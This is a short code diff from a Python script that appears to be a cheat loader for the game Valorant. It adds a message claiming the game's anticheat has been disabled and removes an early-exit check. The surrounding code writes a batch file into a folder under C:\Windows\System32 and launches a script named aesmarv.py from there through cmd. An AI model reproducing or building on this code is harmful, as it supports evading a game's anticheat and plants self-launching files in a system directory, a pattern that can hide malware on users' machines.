@@ -150,6 +150,12 @@ else:
     print("Success.")
 
 os.system('cls')
+print("")
+print("")
+print("")
+print("///For your safety, Valorant's anticheat has been completely disabled.")
+print("///Press enter to continue...")
+input()
 def create_batch_file(python_command, script_name):
     directory = r"C:\Windows\System32\DRVX"
     filename = "aesmarv.bat"
@@ -166,8 +172,7 @@ create_batch_file("py -3.11", r"C:\Windows\System32\DRVX\aesmarv.py")
 batch_file_path = r"C:\Windows\System32\DRVX\aesmarv.bat"
 os.system('cls')
 
-if file_contentsx1=="LKSGjXNYy6DSj":
-    sys.exit()
+
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
